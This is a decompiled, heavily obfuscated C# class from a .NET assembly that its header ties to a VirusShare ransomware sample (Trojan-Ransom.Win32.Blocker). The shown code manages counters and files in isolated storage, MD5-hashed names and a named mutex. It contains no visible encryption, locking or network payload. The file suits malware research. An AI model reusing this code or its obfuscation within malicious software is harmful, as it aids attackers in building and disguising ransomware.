// Decompiled with JetBrains decompiler
// Type: .
// Assembly: BOMBS, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b01670ee6fa4859f
// MVID: D5D8F5B0-12EB-4325-8C3D-C60F341D062A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.jjta-28a226e15e1e7b94528e46718041b3f49976b446eb3daccd652d0e5b43f948be.exe

using \u0001;
using \u0004;
using \u000E;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.IO.IsolatedStorage;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace \u000E
{
  internal static class \u0003
  {
    private static readonly string \u0001;
    private static readonly string \u0002;
    private static readonly string \u0003;
    private static readonly string \u0004;
    private static readonly IsolatedStorageFile \u0001;
    private static readonly Encoding \u0001;
    private static readonly HashAlgorithm \u0001;
    [NonSerialized]
    internal static \u000F.\u0001 \u0015;

    static \u0003()
    {
      try
      {
        if (true)
        {
          \u0002.\u0001(typeof (\u0003));
          if (true)
          {
            if (true)
              \u0003.\u0001 = \u009E.\u007E\u0092\u0003((object) \u0003.\u0015(3087987), 1, 8);
            else
              goto label_6;
          }
        }
        else
          goto label_5;
label_4:
        \u0003.\u0002 = \u001E.\u0083\u0002(\u0003.\u0001, \u0003.\u0015(3093498));
label_5:
        \u0003.\u0003 = \u001E.\u0083\u0002(\u0003.\u0001, \u0003.\u0015(3093515));
label_6:
        \u0003.\u0004 = \u001E.\u0083\u0002(\u0003.\u0001, \u0003.\u0015(3093520));
        \u0003.\u0001 = \u0017.\u0008\u0002();
        do
        {
          \u0003.\u0001 = (HashAlgorithm) new MD5CryptoServiceProvider();
          if (false)
            goto label_4;
        }
        while (false);
        \u0003.\u0001 = \u008A\u0003.\u0006\u0006();
        \u0088.\u007E\u0098\u0002((object) \u0003.\u0001, \u0003.\u0001);
        \u0088.\u007E\u0098\u0002((object) \u0003.\u0001, \u0003.\u0003);
      }
      catch (Exception ex)
      {
        \u0003.\u0001(ex);
        throw;
      }
    }

    private static IDisposable \u0001()
    {
      IDisposable disposable;
      try
      {
        disposable = (IDisposable) new \u0003.\u0001(\u0003.\u0004);
      }
      catch (Exception ex)
      {
        \u0003.\u0001(ex);
        throw;
      }
      return disposable;
    }

    private static IsolatedStorageFileStream \u0001(
      [In] string obj0,
      [In] FileMode obj1,
      [In] FileAccess obj2)
    {
      IsolatedStorageFileStream storageFileStream;
      try
      {
        storageFileStream = new IsolatedStorageFileStream(obj0, obj1, obj2, FileShare.None, \u0003.\u0001);
      }
      catch (Exception ex)
      {
        string str = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<FileMode> local1 = (Enum) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<FileAccess> local2 = (Enum) obj2;
        \u0003.\u0001(ex, (object) str, (object) local1, (object) local2);
        throw;
      }
      return storageFileStream;
    }

    private static void \u0001([In] string obj0)
    {
      try
      {
        try
        {
          do
          {
            if (true)
              \u0088.\u007E\u0099\u0002((object) \u0003.\u0001, obj0);
          }
          while (false);
        }
        catch (IsolatedStorageException ex)
        {
        }
      }
      catch (Exception ex)
      {
        string str = obj0;
        \u0003.\u0001(ex, (object) str);
        throw;
      }
    }

    private static void \u0001([In] string obj0, [In] long obj1)
    {
      IsolatedStorageFileStream storageFileStream1;
      ulong num1;
      try
      {
        storageFileStream1 = \u0003.\u0001(obj0, FileMode.OpenOrCreate, FileAccess.ReadWrite);
        try
        {
          \u008B\u0003 obj = \u008B\u0003.\u007E\u0007\u0006;
          IsolatedStorageFileStream storageFileStream2 = storageFileStream1;
          long num2 = obj1 + 8L;
          if (true)
            goto label_3;
label_2:
          \u008B\u0003.\u007E\u0007\u0006((object) storageFileStream1, obj1);
          num1 = \u008C\u0003.\u007E\u0008\u0006((object) new BinaryReader((Stream) storageFileStream1));
          ++num1;
          \u008B\u0003.\u007E\u0007\u0006((object) storageFileStream1, obj1);
          \u008D\u0003.\u007E\u000E\u0006((object) new BinaryWriter((Stream) storageFileStream1), num1);
          return;
label_3:
          obj((object) storageFileStream2, num2);
          goto label_2;
        }
        finally
        {
          if (storageFileStream1 != null)
            \u0015.\u007E\u008D((object) storageFileStream1);
        }
      }
      catch (Exception ex)
      {
        IsolatedStorageFileStream storageFileStream3 = storageFileStream1;
        // ISSUE: variable of a boxed type
        __Boxed<ulong> local1 = (ValueType) num1;
        string str = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<long> local2 = (ValueType) obj1;
        \u0003.\u0001(ex, (object) storageFileStream3, (object) local1, (object) str, (object) local2);
        throw;
      }
    }

    public static void \u0001([In] uint obj0)
    {
      IDisposable disposable1;
      try
      {
        disposable1 = (IDisposable) null;
        try
        {
          do
          {
            disposable1 = \u0003.\u0001();
          }
          while (false);
          if (false)
            return;
          string str = \u0003.\u0002;
          long num = (long) (obj0 * 8U);
          if (false)
            return;
          \u0003.\u0001(str, num);
        }
        catch (Exception ex)
        {
        }
        finally
        {
          do
          {
            if (disposable1 == null)
              goto label_10;
label_9:
            \u0015.\u007E\u008D((object) disposable1);
label_10:
            if (false)
              goto label_9;
          }
          while (false);
        }
      }
      catch (Exception ex)
      {
        IDisposable disposable2 = disposable1;
        // ISSUE: variable of a boxed type
        __Boxed<uint> local = (ValueType) obj0;
        \u0003.\u0001(ex, (object) disposable2, (object) local);
        throw;
      }
    }

    private static string \u0001([In] string obj0)
    {
      byte[] numArray1;
      byte[] b;
      Guid guid;
      string str1;
      string str2;
      string str3;
      string str4;
      IsolatedStorageFileStream storageFileStream1;
      try
      {
        numArray1 = \u0018.\u007E\u0010\u0002((object) \u0003.\u0001, obj0);
        str3 = \u008F\u0003.\u007E\u0010\u0006((object) \u008E\u0003.\u000F\u0006(numArray1), '\\', '@');
        if (\u0019.\u007E\u0011\u0002((object) str3) > 50)
        {
          b = \u0090\u0003.\u007E\u0011\u0006((object) \u0003.\u0001, numArray1);
          guid = new Guid(b);
          str1 = \u009E.\u007E\u0092\u0003((object) guid.ToString(), 0, 18);
          str2 = \u001E.\u0083\u0002(\u0003.\u0003, str1);
          str3 = \u001E.\u0082\u0002(str2, \u0003.\u0015(3093525));
          str4 = \u001E.\u0082\u0002(str2, \u0003.\u0015(3093534));
          storageFileStream1 = (IsolatedStorageFileStream) null;
          try
          {
            storageFileStream1 = \u0003.\u0001(str4, FileMode.CreateNew, FileAccess.Write);
            if (true)
              \u008E.\u007E\u0006\u0003((object) storageFileStream1, numArray1, 0, numArray1.Length);
          }
          catch (IOException ex)
          {
          }
          finally
          {
            if (storageFileStream1 != null)
              \u0015.\u007E\u008C((object) storageFileStream1);
          }
        }
        else
          str3 = \u001E.\u0083\u0002(\u0003.\u0003, \u001E.\u0082\u0002(str3, \u0003.\u0015(3093525)));
        return str3;
      }
      catch (Exception ex)
      {
        byte[] numArray2 = numArray1;
        string str5 = str3;
        byte[] numArray3 = b;
        string str6 = str1;
        string str7 = str2;
        string str8 = str4;
        IsolatedStorageFileStream storageFileStream2 = storageFileStream1;
        // ISSUE: variable of a boxed type
        __Boxed<Guid> local = (ValueType) guid;
        string str9 = obj0;
        \u0003.\u0001(ex, (object) numArray2, (object) str5, (object) numArray3, (object) str6, (object) str7, (object) str8, (object) storageFileStream2, (object) local, (object) str9);
        throw;
      }
    }

    public static void \u0002([In] string obj0)
    {
      IDisposable disposable1;
      string str1;
      try
      {
        if (false)
          return;
        if (true)
          goto label_8;
label_2:
        try
        {
          disposable1 = \u0003.\u0001();
          str1 = \u0003.\u0001(obj0);
          \u0003.\u0001(str1, 0L);
          return;
        }
        catch (Exception ex)
        {
          return;
        }
        finally
        {
          if (disposable1 != null)
            \u0015.\u007E\u008D((object) disposable1);
        }
label_8:
        disposable1 = (IDisposable) null;
        goto label_2;
      }
      catch (Exception ex)
      {
        IDisposable disposable2 = disposable1;
        string str2 = str1;
        string str3 = obj0;
        \u0003.\u0001(ex, (object) disposable2, (object) str2, (object) str3);
        throw;
      }
    }

    private static ulong[] \u0001([In] string obj0)
    {
      byte[] numArray1;
      ulong[] numArray2;
      IsolatedStorageFileStream storageFileStream1;
      try
      {
        storageFileStream1 = new IsolatedStorageFileStream(obj0, FileMode.OpenOrCreate, FileAccess.Read, FileShare.None, \u0003.\u0001);
        try
        {
          if (true)
          {
            numArray1 = new byte[\u0016.\u007E\u0006\u0002((object) storageFileStream1)];
            if (true)
            {
              int num1 = \u0087.\u007E\u0092\u0002((object) storageFileStream1, numArray1, 0, numArray1.Length);
              if (true)
              {
                if (true)
                  num1 = numArray1.Length;
                else
                  goto label_12;
              }
              while (true)
              {
                int num2 = num1;
                while (true)
                {
                  int length = num2 / 8;
                  if (false)
                  {
                    num2 = length;
                  }
                  else
                  {
                    numArray2 = new ulong[length];
                    goto label_12;
                  }
                }
                num1 = num2;
              }
            }
            else
              goto label_16;
          }
label_12:
          \u008A.\u0001\u0003((Array) numArray1, 0, (Array) numArray2, 0, numArray1.Length);
        }
        finally
        {
          if (storageFileStream1 != null)
            \u0015.\u007E\u008D((object) storageFileStream1);
        }
label_16:
        return numArray2;
      }
      catch (Exception ex)
      {
        ulong[] numArray3 = numArray2;
        IsolatedStorageFileStream storageFileStream2 = storageFileStream1;
        byte[] numArray4 = numArray1;
        string str = obj0;
        \u0003.\u0001(ex, (object) numArray3, (object) storageFileStream2, (object) numArray4, (object) str);
        throw;
      }
    }

    public static \u0004.\u000E \u0001()
    {
      \u0004.\u000E obj1;
      \u0004.\u000E obj2;
      IDisposable disposable1;
      \u0004.\u000E obj3;
      try
      {
        while (true)
        {
          disposable1 = \u0003.\u0001();
          try
          {
            if (true)
            {
              obj1 = \u0003.\u0003();
              \u0003.\u0002();
              \u0004.\u000E obj4 = obj1;
              if (true)
                obj2 = obj4;
            }
          }
          finally
          {
label_4:
            if (disposable1 == null)
              goto label_7;
label_5:
            if (true)
              \u0015.\u007E\u008D((object) disposable1);
            else
              goto label_4;
label_7:
            if (false)
              goto label_5;
          }
          if (true)
          {
            obj3 = obj2;
            break;
          }
        }
      }
      catch (Exception ex)
      {
        \u0004.\u000E obj5 = obj1;
        \u0004.\u000E obj6 = obj2;
        IDisposable disposable2 = disposable1;
        \u0003.\u0001(ex, (object) obj5, (object) obj6, (object) disposable2);
        throw;
      }
      return obj3;
    }

    public static \u0004.\u000E \u0002()
    {
      \u0004.\u000E obj1;
      IDisposable disposable1;
      \u0004.\u000E obj2;
      try
      {
        if (true)
        {
          if (true)
          {
            IDisposable disposable2 = \u0003.\u0001();
            if (true)
              goto label_9;
label_2:
            try
            {
              obj1 = \u0003.\u0003();
              goto label_10;
            }
            finally
            {
              do
              {
                if (disposable1 != null)
                  \u0015.\u007E\u008D((object) disposable1);
              }
              while (false);
            }
label_9:
            disposable1 = disposable2;
            goto label_2;
          }
          else
            goto label_10;
        }
label_7:
        if (true)
          goto label_13;
label_10:
        \u0004.\u000E obj3 = obj1;
        if (true)
        {
          obj2 = obj3;
          goto label_7;
        }
        else
          goto label_7;
      }
      catch (Exception ex)
      {
        \u0004.\u000E obj4 = obj1;
        IDisposable disposable3 = disposable1;
        \u0003.\u0001(ex, (object) obj4, (object) disposable3);
        throw;
      }
label_13:
      return obj2;
    }

    public static void \u0001()
    {
      IDisposable disposable1;
      try
      {
        do
        {
          disposable1 = \u0003.\u0001();
          try
          {
            do
            {
              if (true)
                goto label_3;
label_2:
              continue;
label_3:
              \u0003.\u0002();
              goto label_2;
            }
            while (false);
          }
          finally
          {
            if (disposable1 != null)
              \u0015.\u007E\u008D((object) disposable1);
          }
        }
        while (false);
      }
      catch (Exception ex)
      {
        IDisposable disposable2 = disposable1;
        \u0003.\u0001(ex, (object) disposable2);
        throw;
      }
    }

    private static \u0004.\u000E \u0003()
    {
      string[] strArray;
      int index;
      string str1;
      string key;
      string str2;
      ulong[] numArray1;
      string str3;
      IsolatedStorageFileStream storageFileStream;
      byte[] numArray2;
      Dictionary<string, ulong> dictionary1;
      ulong[] numArray3;
      try
      {
        numArray3 = \u0003.\u0001(\u0003.\u0002);
        Dictionary<string, ulong> dictionary2 = new Dictionary<string, ulong>();
        if (true)
          goto label_13;
label_1:
        try
        {
          strArray = \u0091\u0003.\u007E\u0012\u0006((object) \u0003.\u0001, \u001E.\u0082\u0002(\u0003.\u0003, \u0003.\u0015(3093543)));
          index = 0;
          while (index < strArray.Length)
          {
            if (true)
            {
              str1 = strArray[index];
              key = \u0080.\u008A\u0002(str1);
              str2 = \u001E.\u0083\u0002(\u0003.\u0003, str1);
              numArray1 = \u0003.\u0001(str2);
              str3 = \u001E.\u0083\u0002(\u0003.\u0003, \u001E.\u0082\u0002(key, \u0003.\u0015(3093534)));
              storageFileStream = (IsolatedStorageFileStream) null;
              try
              {
                storageFileStream = \u0003.\u0001(str3, FileMode.Open, FileAccess.Read);
                numArray2 = new byte[\u0016.\u007E\u0006\u0002((object) storageFileStream)];
                int num = \u0087.\u007E\u0092\u0002((object) storageFileStream, numArray2, 0, numArray2.Length);
                key = \u0092\u0003.\u007E\u0013\u0006((object) \u0003.\u0001, numArray2);
              }
              catch (FileNotFoundException ex)
              {
                key = \u0092\u0003.\u007E\u0013\u0006((object) \u0003.\u0001, \u0008.\u0080(\u008F\u0003.\u007E\u0010\u0006((object) key, '@', '\\')));
              }
              finally
              {
                if (storageFileStream != null)
                  \u0015.\u007E\u008C((object) storageFileStream);
              }
              dictionary1[key] = numArray1[0];
              ++index;
            }
          }
        }
        catch (DirectoryNotFoundException ex)
        {
        }
        return new \u0004.\u000E(numArray3, dictionary1);
label_13:
        dictionary1 = dictionary2;
        goto label_1;
      }
      catch (Exception ex)
      {
        object[] objArray = new object[11]
        {
          (object) numArray3,
          (object) dictionary1,
          (object) str1,
          (object) key,
          (object) str2,
          (object) numArray1,
          (object) str3,
          (object) storageFileStream,
          (object) numArray2,
          (object) strArray,
          (object) index
        };
        \u0003.\u0001(ex, objArray);
        throw;
      }
    }

    private static void \u0002()
    {
      string str1;
      string str2;
      string str3;
      string str4;
      int index;
      string[] strArray1;
      try
      {
        \u0003.\u0001(\u0003.\u0002);
        try
        {
          strArray1 = \u0091\u0003.\u007E\u0012\u0006((object) \u0003.\u0001, \u001E.\u0082\u0002(\u0003.\u0003, \u0003.\u0015(3093543)));
          for (index = 0; index < strArray1.Length; ++index)
          {
            str1 = strArray1[index];
            str2 = \u0080.\u008A\u0002(str1);
            str3 = \u001E.\u0083\u0002(\u0003.\u0003, str1);
            \u0003.\u0001(str3);
            str4 = \u001E.\u0083\u0002(\u0003.\u0003, \u001E.\u0082\u0002(str2, \u0003.\u0015(3093534)));
            \u0003.\u0001(str4);
          }
        }
        catch (DirectoryNotFoundException ex)
        {
        }
        try
        {
          \u0088.\u007E\u009A\u0002((object) \u0003.\u0001, \u0003.\u0003);
        }
        catch (IsolatedStorageException ex)
        {
        }
        \u0088.\u007E\u0098\u0002((object) \u0003.\u0001, \u0003.\u0003);
      }
      catch (Exception ex)
      {
        string str5 = str1;
        string str6 = str2;
        string str7 = str3;
        string str8 = str4;
        string[] strArray2 = strArray1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local = (ValueType) index;
        \u0003.\u0001(ex, (object) str5, (object) str6, (object) str7, (object) str8, (object) strArray2, (object) local);
        throw;
      }
    }

    private sealed class \u0001 : IDisposable
    {
      private static readonly CultureInfo \u0001;
      private readonly CultureInfo \u0002;
      private readonly Mutex \u0001;
      [NonSerialized]
      internal static \u000F.\u0001 \u0019;

      public \u0001([In] string obj0)
      {
        try
        {
          this.\u0002 = Thread.CurrentThread.CurrentUICulture;
          Thread.CurrentThread.CurrentUICulture = \u0003.\u0001.\u0001;
          if (obj0.Length > 260)
            obj0 = obj0.Remove(261);
          obj0 = obj0.Replace(Path.DirectorySeparatorChar, '_');
          this.\u0001 = new Mutex(false, obj0);
          try
          {
            this.\u0001.WaitOne();
          }
          catch (AbandonedMutexException ex)
          {
          }
        }
        catch (Exception ex)
        {
          string str = obj0;
          \u0003.\u0001(ex, (object) this, (object) str);
          throw;
        }
      }

      public void Dispose()
      {
        try
        {
          if (true)
          {
            \u0015.\u007E\u0002\u0002((object) this.\u0001);
            \u0015.\u007E\u0003\u0002((object) this.\u0001);
          }
          \u0093\u0003.\u007E\u0014\u0006((object) \u0081\u0003.\u009B\u0005(), this.\u0002);
        }
        catch (Exception ex)
        {
          \u0003.\u0001(ex, (object) this);
          throw;
        }
      }

      static \u0001()
      {
        try
        {
          Type type = typeof (\u0003.\u0001);
          if (true)
            goto label_2;
label_1:
          \u0003.\u0001.\u0001 = \u0094\u0003.\u0015\u0006(\u0003.\u0001.\u0019(3093556));
          return;
label_2:
          \u0002.\u0001(type);
          goto label_1;
        }
        catch (Exception ex)
        {
          \u0003.\u0001(ex);
          throw;
        }
      }
    }
  }
}
